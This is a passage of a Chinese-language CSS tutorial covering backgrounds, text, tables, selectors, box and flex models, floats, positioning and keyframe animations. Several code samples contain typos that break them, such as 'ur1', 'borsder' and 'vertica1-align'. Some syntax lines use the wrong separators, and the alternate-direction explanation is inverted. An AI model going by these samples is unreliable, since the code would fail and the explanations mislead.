style="text-align:center">计算相对位置区域的百分比，第一个值宽度，第二个值高度，如果只是设置一个，第二个值auto</td></tr><tr><td style="text-align:center">cover</td><td style="text-align:center">保持图片纵横比并将图片缩放成完全覆盖背景区域的最小大小</td></tr><tr><td style="text-align:center">contain</td><td style="text-align:center">保持图片纵横比并将图像缩放成适合背景定位区域的最大大小</td></tr></tbody></table></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">background-image</span>: ur1 (<span class="string">&quot;images/img1.jpg&quot;</span> );</span><br><span class="line"><span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line"><span class="attribute">background-size</span>: <span class="number">100%</span><span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="background-position属性"><a href="#background-position属性" class="headerlink" title="background-position属性"></a>background-position属性</h2><p>该属性设置背景图像的起始位置，其默认值是:0% 0%</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">left top</td><td style="text-align:center">左上角</td></tr><tr><td style="text-align:center">left center</td><td style="text-align:center">左中</td></tr><tr><td style="text-align:center">left bottom</td><td style="text-align:center">左下</td></tr><tr><td style="text-align:center">right top</td><td style="text-align:center">右上角</td></tr><tr><td style="text-align:center">right center</td><td style="text-align:center">右中</td></tr><tr><td style="text-align:center">right bottom</td><td style="text-align:center">右下</td></tr><tr><td style="text-align:center">center top</td><td style="text-align:center">中上</td></tr><tr><td style="text-align:center">center  center</td><td style="text-align:center">中中</td></tr><tr><td style="text-align:center">center bottom</td><td style="text-align:center">中下</td></tr><tr><td style="text-align:center">x% y%</td><td style="text-align:center">第一个值是水平位置，第二个值是垂直位置，左上角是0% 0%，右下角是100%—100%。如果只指定了一个值，其他值默认是50%。默认是0%0%</td></tr><tr><td style="text-align:center">xpos ypos</td><td style="text-align:center">单位是像素</td></tr></tbody></table></div><hr><h1 id="CSS字体属性"><a href="#CSS字体属性" class="headerlink" title="CSS字体属性"></a>CSS字体属性</h1><h2 id="text-align"><a href="#text-align" class="headerlink" title="text-align"></a>text-align</h2><p>指定元素文本的水平对齐方式</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">left</td><td style="text-align:center">文本居左排列，默认值</td></tr><tr><td style="text-align:center">right</td><td style="text-align:center">文本向右排列</td></tr><tr><td style="text-align:center">center</td><td style="text-align:center">文本居中排列</td></tr></tbody></table></div><h2 id="text-decoration"><a href="#text-decoration" class="headerlink" title="text-decoration"></a>text-decoration</h2><p>text-decoration 属性规定添加到文本的修饰，下划线、上划线、删除线等</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">underline</td><td style="text-align:center">定义下划线</td></tr><tr><td style="text-align:center">overline</td><td style="text-align:center">定义上划线</td></tr><tr><td style="text-align:center">line-through</td><td style="text-align:center">定义删除线</td></tr></tbody></table></div><h2 id="text-transform"><a href="#text-transform" class="headerlink" title="text-transform"></a>text-transform</h2><p>text-transform属性控制文本的大小写</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">captialize</td><td style="text-align:center">定义每个单词开头大写</td></tr><tr><td style="text-align:center">uppercase</td><td style="text-align:center">定义全部大写字母</td></tr><tr><td style="text-align:center">lowercase</td><td style="text-align:center">定义全部小写字母</td></tr></tbody></table></div><h3 id="text-indent"><a href="#text-indent" class="headerlink" title="text-indent"></a>text-indent</h3><p>text-indent 属性规定文本块中首行文本的缩进</p><div class="note success no-icon flat"><p>Tips：每个值用逗号分开，如果字体名称包含空格，它必须加上引号</p></div><hr><h1 id="CSS表格属性"><a href="#CSS表格属性" class="headerlink" title="CSS表格属性"></a>CSS表格属性</h1><h2 id="表格边框"><a href="#表格边框" class="headerlink" title="表格边框"></a>表格边框</h2><p>指定css表格边框，使用border属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span>,<span class="selector-tag">td</span>&#123;</span><br><span class="line">borsder:<span class="number">1px</span> solid black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="折叠边框"><a href="#折叠边框" class="headerlink" title="折叠边框"></a>折叠边框</h2><p>border-collapse属性设置表格的边框是否被纸叠成一个单一的边框或隔开</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span> &#123; <span class="attribute">border-collapse</span>:collapse; &#125;</span><br><span class="line"><span class="selector-tag">table</span>,<span class="selector-tag">td</span> &#123; <span class="attribute">border</span>: <span class="number">1px</span> solid black; &#125;</span><br></pre></td></tr></table></figure><h2 id="表格宽度和高度"><a href="#表格宽度和高度" class="headerlink" title="表格宽度和高度"></a>表格宽度和高度</h2><p>width和height属性定义表格的宽度和高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span> &#123; <span class="attribute">width</span>:<span class="number">100%</span>; &#125;</span><br><span class="line"><span class="selector-tag">td</span> &#123; <span class="attribute">height</span>:<span class="number">50px</span>; &#125;</span><br></pre></td></tr></table></figure><h2 id="表格文字对齐"><a href="#表格文字对齐" class="headerlink" title="表格文字对齐"></a>表格文字对齐</h2><p>表格中的文本对齐和垂直对齐属性</p><p>text-align属性设置水平对齐方式，向左，右，或中心</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">td</span> &#123;<span class="attribute">text-align</span><span class="selector-pseudo">:right</span>; &#125;</span><br></pre></td></tr></table></figure><h2 id="垂直对齐属性设置垂直对齐"><a href="#垂直对齐属性设置垂直对齐" class="headerlink" title="垂直对齐属性设置垂直对齐"></a>垂直对齐属性设置垂直对齐</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">td</span> &#123; <span class="attribute">height</span> : <span class="number">50px</span>; vertica1-align: bottom;&#125;</span><br></pre></td></tr></table></figure><h2 id="表格填充"><a href="#表格填充" class="headerlink" title="表格填充"></a>表格填充</h2><p>如果在表的内容中控制空格之间的边框，应使用td和th元素的填充属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">td</span> &#123; <span class="attribute">padding</span>: <span class="number">15px</span>; &#125;</span><br></pre></td></tr></table></figure><h2 id="表格颜色"><a href="#表格颜色" class="headerlink" title="表格颜色"></a>表格颜色</h2><p>下面的例子指定边框的颜色，和th元素的文本和背景颜色</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span>,<span class="selector-tag">td</span>,<span class="selector-tag">th</span> &#123; <span class="attribute">border</span>: <span class="number">1px</span> solid green; &#125; </span><br><span class="line"><span class="selector-tag">td</span> &#123; <span class="attribute">background-color</span>: green; <span class="attribute">color</span>: white; &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="CSS关系选择器"><a href="#CSS关系选择器" class="headerlink" title="CSS关系选择器"></a>CSS关系选择器</h1><h2 id="关系选择器分类"><a href="#关系选择器分类" class="headerlink" title="关系选择器分类"></a>关系选择器分类</h2><ol><li>后代选择器</li><li>子代选择器</li><li>相邻兄弟选择器</li><li>通用兄弟选择器</li></ol><h2 id="后代选择器"><a href="#后代选择器" class="headerlink" title="后代选择器"></a>后代选择器</h2><div style="font-size:20px;"><b>定义</b></div><p>选择所有被E元素包含的F元素，中间用空格隔开</p><div style="font-size:20px;"><b>语法</b></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E F&#123;&#125;;</span><br></pre></td></tr></table></figure><p><strong>举例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>手机<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>电脑<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>手机<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>电脑<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//所有的li标签都被包含在内</span><br><span class="line">ul li&#123;</span><br><span class="line">color:green；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="子代选择器"><a href="#子代选择器" class="headerlink" title="子代选择器"></a>子代选择器</h2><div style="font-size:20px;"><b>定义</b></div><p>选择所有作为E元素的直接子元素F，对更深一层的元素不起作用，用&gt;表示</p><div style="font-size:20px;"><b>语法</b></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E&gt;F&#123;  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>子元素1&lt;/ a&gt;</span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>孙元素<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>子元素2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">div&gt;a&#123;</span><br><span class="line">color : red</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="相邻兄弟选择器"><a href="#相邻兄弟选择器" class="headerlink" title="相邻兄弟选择器"></a>相邻兄弟选择器</h2><div style="font-size:20px;"><b>定义</b></div><p>选择紧跟E元素后的F元素，用加号表示，选择相邻的第一个兄弟元素，只能向下选择</p><div style="font-size:20px;"><b>语法</b></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E+F&#123; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>h1元素<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>第一个元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>第二个元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> h1+p&#123;</span><br><span class="line"> color : red;3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="通用兄弟选择器"><a href="#通用兄弟选择器" class="headerlink" title="通用兄弟选择器"></a>通用兄弟选择器</h4><div style="font-size:20px;"><b>定义</b></div><p>选择E元素之后的所有兄弟元素F，作用于多个元素，用~隔开</p><div style="font-size:20px;"><b>语法</b></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E~F&#123; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>h1元素<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>第一个元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>第二个元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">h1~p&#123;</span><br><span class="line">color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="CSS盒子模型（box-model）"><a href="#CSS盒子模型（box-model）" class="headerlink" title="CSS盒子模型（box model）"></a>CSS盒子模型（box model）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>所有HTML元素可以看作盒子，在CSS中，”box model”这一术语是用来设计和布局时使用CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括:<br>外边距(margin)，边框 (border)，内边距(padding)，和实际内容(content)</p><ol><li>Margin(外边距)-清除边框外的区域，外边距是透明的</li><li>Border(边框)-围绕在内边距和内容外的边框</li><li>Padding(内边距)-清除内容周围的区域（两个值：第一个值上下，第二个值左右）</li><li>Content(内容)-盒子的内容，显示文本和图像</li></ol><p>如果把盒子模型看作是一个生活中的快递，那么内容部分等同于你买的实物，内边距等同于快递盒子中的泡沫，边框等同于快递盒子，外边距等同于两个快递盒子之间的距离</p><h1 id="CSS弹性盒子模型（flex-model）"><a href="#CSS弹性盒子模型（flex-model）" class="headerlink" title="CSS弹性盒子模型（flex model）"></a>CSS弹性盒子模型（flex model）</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>弹性盒子是CSS3的一种新的布局模式</p><p>CSS3 弹性盒是一种当页面需要适应不同的屏幕大小以及设备类型时确保元素拥有恰当的行为的布局方式引入弹性盒布局模型的目的是提</p><p>供一种更加有效的方式来对一个容器中的子元素进行排列、对齐和分配空白空间</p><h2 id="CSS3弹性盒内容"><a href="#CSS3弹性盒内容" class="headerlink" title="CSS3弹性盒内容"></a>CSS3弹性盒内容</h2><p>弹性盒子由弹性容器(Flex container)和弹性子元素(Flex item)组成弹性容器通过设置display 属性的值为flex将其定义为弹性容器弹性容器</p><p>内包含了一个或多个弹性子元素</p><blockquote><p>弹性容器外及弹性子元素内是正常渲染的。弹性盒子只定义了弹性子元素如何在弹性容器内布局</p><p>默认弹性盒子里的内容是横向摆放</p></blockquote><h2 id="父元素上的属性"><a href="#父元素上的属性" class="headerlink" title="父元素上的属性"></a>父元素上的属性</h2><p>display 属性</p><p>display:flex;开启弹性盒</p><p>display:flex;属性设置后子元素默认水平排列</p><h2 id="flex-direction属性"><a href="#flex-direction属性" class="headerlink" title="flex-direction属性"></a>flex-direction属性</h2><div style="font-size:20px;"><b>定义</b></div>flex-direction属性指定了弹性子元素在父容器中的位置<div style="font-size:20px;"><b>语法</b></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flex-direction</span>: row / row-reverse | column / column-reverse</span><br></pre></td></tr></table></figure><ol><li>row:横向从左到右排列(左对齐)，默认的排列方式</li><li>row-reverse:反转横向排列(右对齐，从后往前排，最后一项排在最前面</li><li>column:纵向排列</li><li>column-reverse:反转纵向排列，从后往前排，最后一项排在最上面</li></ol><h4 id="justify-content属性"><a href="#justify-content属性" class="headerlink" title="justify-content属性"></a>justify-content属性</h4><div style="font-size:20px;"><b>定义</b></div><p>内容对齐(justify-content)属性应用在弹性容器上，把弹性项沿着弹性容器的主轴线(main axis）对齐</p><div style="font-size:20px;"><b>语法</b></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">justify-content</span>: flex-start \ flex-end / center</span><br></pre></td></tr></table></figure><ol><li>flex-start弹性项目向行头紧挨着填充。这个是默认值。第一个弹性项的main-start外边距边线被放置在该行的main-start边线，而后续弹性项依次平齐摆放</li><li>flex-end弹性项目向行尾紧挨着填充。第一个弹性项的main-end外边距边线被放置在该行的main-end边线，而后续弹性项依次平齐摆放</li><li>center弹性项目居中紧挨着填充。(如果剩余的自由空间是负的，则弹性项目将在两个方向上同时溢出)</li></ol><h2 id="align-items属性"><a href="#align-items属性" class="headerlink" title="align-items属性"></a>align-items属性</h2><div style="font-size:20px;"><b>定义</b></div><p>align-items设置或检索弹性盒子元素在侧轴(纵轴）方向上的对齐方式</p><div style="font-size:20px;"><b>语法</b></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>align-items: flex-start | flex-end / center</span><br></pre></td></tr></table></figure><ol><li>flex-start弹性盒子元素的侧轴（纵轴）起始位置的边界紧靠住该行的侧轴起始边界</li><li>flex-end 弹性盒子元素的侧轴（纵轴）起始位置的边界紧靠住该行的侧轴结束边界</li><li>center 弹性盒子元素在该行的侧轴（纵轴）上居中放置。(如果该行的尺寸小于弹性盒子元素的尺寸，则<br>会向两个方向溢出相同的长度)</li></ol><h2 id="子元素上的属性"><a href="#子元素上的属性" class="headerlink" title="子元素上的属性"></a>子元素上的属性</h2><div style="font-size:20px;"><b>flex</b></div><p>flex根据弹性盒子元素所设置的扩展因子作为比率来分配剩余空间</p><p>默认为0，即如果存在剩余空间，也不放大</p><p>如果只有一个子元素设置，那么按扩展因子转化的百分比对其分配剩余空间。0.1即10%，1即100%，超出按100%</p><hr><h1 id="文档流"><a href="#文档流" class="headerlink" title="文档流"></a>文档流</h1><p>文档流是文档中可显示对象在排列时所占用的位置/空间</p><p>例如:块元素自上而下摆放，内联元素，从左到右摆放</p><p>标准流里面的限制非常多，导致很多页面效果无法实现</p><ol><li><p>高矮不齐，底边对齐</p></li><li><p>空白折叠现象</p><ul><li><p>无论多少个空格、换行、tab，都会折叠为一个空格</p></li><li><p>如果我们想让img标签之间没有空隙，必须紧密连接</p></li></ul></li></ol><hr><h1 id="脱离文档流"><a href="#脱离文档流" class="headerlink" title="脱离文档流"></a>脱离文档流</h1><p>使一个元素脱离标准文档流有三中方式</p><ol><li>浮动</li><li>绝对定位</li><li>固定定位</li></ol><h2 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h2><p>float属性定义元素在哪个方向浮动，任何元素都可以浮动。</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">left</td><td style="text-align:center">元素向左浮动</td></tr><tr><td style="text-align:center">right</td><td style="text-align:center">元素向右浮动</td></tr></tbody></table></div><div style="font-size:20px;"><b>浮动的原理</b></div><ol><li>浮动以后使元素脱离了文档流</li><li>浮动只有左右浮动，没有上下浮动</li></ol><p><div style="font-size:20px;"><b>元素向左浮动</b></div><br>脱离文档流之后，元素相当于在页面上面增加一个浮层来放置内容。此时可以理解为有两层页面，一层是底层的原页面，一层是脱离文档流的上层页面，所以会出现折叠现象</p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/webstudy/e89d1425a504e03b17cb3dc727760ee.png" alt="e89d1425a504e03b17cb3dc727760ee"></p><p>当所有元素同时浮动的时候，会变成水平摆放，向左或者向右</p><p>当容器不足以横向摆放内容的时候，会在下一行摆放</p><h2 id="浮动副作用"><a href="#浮动副作用" class="headerlink" title="浮动副作用"></a><strong>浮动副作用</strong></h2><p>当元素设置float浮动后，该元素就会脱离文档流并向左/向右浮动</p><p>浮动元素会造成父元素高度塌陷</p><p>后续元素会受到影响</p><h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><p>当父元素出现塌陷的时候，对布局是不利的，所以我们必须清除副作用</p><p>解决方案有很多种</p><ol><li>父元素设置高度</li><li>受影响的元素增加clear属性</li><li>overflow清除浮动</li><li>伪对象方式</li></ol><h3 id="父元素设置高度"><a href="#父元素设置高度" class="headerlink" title="父元素设置高度"></a><strong>父元素设置高度</strong></h3><p>如果父元素高度塌陷，可以给父元素设置高度，撑开元素本身大小</p><h3 id="clear属性"><a href="#clear属性" class="headerlink" title="clear属性"></a>clear属性</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">clear</span>: left // right  // both</span><br></pre></td></tr></table></figure><h3 id="overflow清除浮动"><a href="#overflow清除浮动" class="headerlink" title="overflow清除浮动"></a>overflow清除浮动</h3><p>如果有父级塌陷，并且同级元素也收到了影响，可以使用overflow清除浮动</p><p>这种情况下，父布局不能设置高度</p><p>父级标签的样式里面加: overflow:hidden clear:both ;</p><h3 id="伪对象方式"><a href="#伪对象方式" class="headerlink" title="伪对象方式"></a>伪对象方式</h3><p>如果有父级塌陷，并且同级元素也收到了影响，还可以使用伪对象方式处理</p><p>为父标签添加伪类after ,设置空的内容，并且使用clear:both ;</p><p>这种情况下，父布局不能设置高度</p><hr><h1 id="CSS定位"><a href="#CSS定位" class="headerlink" title="CSS定位"></a>CSS定位</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>position属性指定了元素的定位类型</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">relative</td><td style="text-align:center">相对定位</td></tr><tr><td style="text-align:center">absolute</td><td style="text-align:center">绝对定位</td></tr><tr><td style="text-align:center">fixed</td><td style="text-align:center">固定定位</td></tr></tbody></table></div><p>其中，绝对定位和固定定位会脱离文档流</p><p>设置定位之后:可以使用四个方向值进行调整位置: left、top、right、bottom</p><hr><h1 id="CSS3新特性"><a href="#CSS3新特性" class="headerlink" title="CSS3新特性"></a>CSS3新特性</h1><h2 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a><strong>圆角</strong></h2><p>使用CSS3border-radius属性，你可以给任何元素制作”圆角”</p><p><strong>border-radius属性</strong>，可以使用以下规则:</p><ol><li>四个值:第一个值为左上角，第二个值为右上角，第三个值为右下角，第四个值为左下角</li><li>三个值:第一个值为左上角,第二个值为右上角和左下角，第三个值为右下角</li><li>两个值:第一个值为左上角与右下角，第二个值为右上角与左下角</li><li>一个值:四个圆角值相同</li></ol><h2 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h2><p>box-shadow向框添加一个或多个阴影。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-shadow</span>: h-shadow v-shadow blur color;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">h-shadow</td><td style="text-align:center">必选，水平阴影的位置</td></tr><tr><td style="text-align:center">v-shadow</td><td style="text-align:center">必选，垂直阴影的位置</td></tr><tr><td style="text-align:center">blur</td><td style="text-align:center">可选，模糊距离</td></tr><tr><td style="text-align:center">color</td><td style="text-align:center">可选，阴影的颜色</td></tr></tbody></table></div><h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><p>动画是使元素从一种样式逐渐变化为另一种样式的效果您可以改变任意多的样式任意多的次数</p><p>请用百分比来规定变化发生的时间，或用关键词”from”和”to”，等同于0%和100%0%是动画的开始，100%是动画的完成。</p><p>keyframes创建动画</p><p>使用 <code>@keyframes</code> 规则，你可以创建动画</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> name &#123;</span><br><span class="line"><span class="selector-tag">from</span>|<span class="number">0%</span>|&#123;</span><br><span class="line">CSS样式</span><br><span class="line">&#125;</span><br><span class="line">percent&#123;</span><br><span class="line">CSS样式</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">to</span>|<span class="number">100%</span>|&#123;</span><br><span class="line">CSS样式</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>name：动画名称，开发人员自己命名；</p><p>percent：为百分比值，可以添加多个百分比值；</p><h2 id="animation执行动画"><a href="#animation执行动画" class="headerlink" title="animation执行动画"></a>animation执行动画</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">animation</span>: name duration timing-function delay iteration-count direction;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">name</td><td style="text-align:center">设置动画的名称</td></tr><tr><td style="text-align:center">duration</td><td style="text-align:center">设置动画的持续时间</td></tr><tr><td style="text-align:center">timing-function</td><td style="text-align:center">设置动画效果的速率(如下)</td></tr><tr><td style="text-align:center">delay</td><td style="text-align:center">设置动画的开始时间(延时执行)</td></tr><tr><td style="text-align:center">iteration-count</td><td style="text-align:center">设置动画循环的次数，infinite为无限次数的循环</td></tr><tr><td style="text-align:center">direction</td><td style="text-align:center">设置动画播放的方向(如下)</td></tr><tr><td style="text-align:center">animation-play-state</td><td style="text-align:center">控制动画的播放状态: running代表播放，而paused代表停止播放</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">timing-function值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">ease</td><td style="text-align:center">逐渐变慢（默认）</td></tr><tr><td style="text-align:center">linear</td><td style="text-align:center">匀速</td></tr><tr><td style="text-align:center">ease-in</td><td style="text-align:center">加速</td></tr><tr><td style="text-align:center">ease-out</td><td style="text-align:center">减速</td></tr><tr><td style="text-align:center">ease-in-out</td><td style="text-align:center">先加速后减速</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">direction值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">normal</td><td style="text-align:center">默认值为normal表示向前播放</td></tr><tr><td style="text-align:center">alternate</td><td style="text-align:center">动画播放在第偶数次方向前播放，第奇数次向反方向播放</td></tr></tbody></table></div><h2 id="呼吸动画"><a href="#呼吸动画" class="headerlink" title="呼吸动画"></a>呼吸动画</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">animation</span>:breathe <span class="number">2.7s</span> ease-in-out infinite alternate;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> breathe &#123;</span><br><span class="line"><span class="number">0%</span>&#123;</span><br><span class="line"><span class="attribute">opacity</span>:<span class="number">0.2</span>;</span><br><span class="line"><span class="attribute">box-shadow</span>:<span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">50%</span>&#123;</span><br><span class="line"><span class="attribute">opacity</span>:<span class="number">0.5</span>;</span><br><span class="line"><span class="attribute">box-shadow</span>:<span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">100%</span>&#123;</span><br><span class="line"><span class="attribute">opacity</span>:<span class="number">1</span>;</span><br><span class="line"><span class="attribute">box-shadow</span>:<span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> green;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="媒体查询"><a href="#媒体查询" class="headerlink" 